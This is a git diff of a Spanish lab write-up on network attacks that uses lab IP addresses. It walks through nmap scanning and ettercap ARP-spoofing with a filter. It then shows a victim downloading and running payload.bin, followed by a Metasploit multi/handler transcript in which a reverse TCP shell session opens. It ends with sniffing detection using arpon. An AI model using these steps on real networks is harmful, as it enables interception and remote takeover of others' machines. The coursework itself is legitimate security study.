@@ -60,12 +60,7 @@ nmap -6 -sn -iL ipv6_addresses.txt
 # Limpiar archivos temporales
 rm ipv4_addresses.txt
 rm ipv6_addresses.txt
-
-
 ```
-
-
-
 
 Obtenga la relación de las direcciones IPv6 de su segmento.
 > `ping6 -c2 -I ens33 ff02::1`
@@ -104,8 +99,6 @@ Activamos el ip_forwarding
 Encendemos el ettercap con el filtro
 > ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.106/ //10.11.48.1/
 
-
-
 Desde el cliente:
 >  lynx http://example.org
 > (Vemos la pagina y nos descargamos el virus)
@@ -116,38 +109,31 @@ Damos permisos de ejecucion
 Ejecutamos el virus
 > ./payload.bin
 
-
 Desde el atacante:
 Entramos en la consola de metasploit
 > msfconsole
 
-´´´bash
-msf6 > use multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
-payload => linux/x86/shell/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 10.11.48.50
-LHOST => 10.11.48.50
-msf6 exploit(multi/handler) > set LPORT 4444
-LPORT => 4444
-msf6 exploit(multi/handler) > exploit
+    bash
+    msf6 > use multi/handler
+    [*] Using configured payload generic/shell_reverse_tcp
+    msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
+    payload => linux/x86/shell/reverse_tcp
+    msf6 exploit(multi/handler) > set LHOST 10.11.48.50
+    LHOST => 10.11.48.50
+    msf6 exploit(multi/handler) > set LPORT 4444
+    LPORT => 4444
+    msf6 exploit(multi/handler) > exploit
+    [*] Started reverse TCP handler on 10.11.48.50:4444 
+    [*] Sending stage (36 bytes) to 10.11.49.106
+    [*] Command shell session 1 opened (10.11.48.50:4444 -> 10.11.49.106:56054) at 2022-11-03 13:55:42 +0100
 
-[*] Started reverse TCP handler on 10.11.48.50:4444 
-[*] Sending stage (36 bytes) to 10.11.49.106
-[*] Command shell session 1 opened (10.11.48.50:4444 -> 10.11.49.106:56054) at 2022-11-03 13:55:42 +0100
-
-```
 
 Ahora estamos dentro del cliente desde el atacante
 
 Salimos cuando queramos
 > msf6 exploit(multi/handler) > exit
+
 En la máquina de la víctima simulamos una descarga del href introducido:
-
-
-
-
-
 
 ## APARTADO H
 > ettercap -6 -T -q -i ens33 -M arp:remote //2002:a0b:3136::1/ //::10.11.48.1/
@@ -159,6 +145,7 @@ Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente
 > `apt install arpon`
 - Para vaciar la tabla arp: `ip -s -s neigh flush all`
 > `nano /etc/arpon.conf`
+
 ```
 #
 # ArpON configuration file.
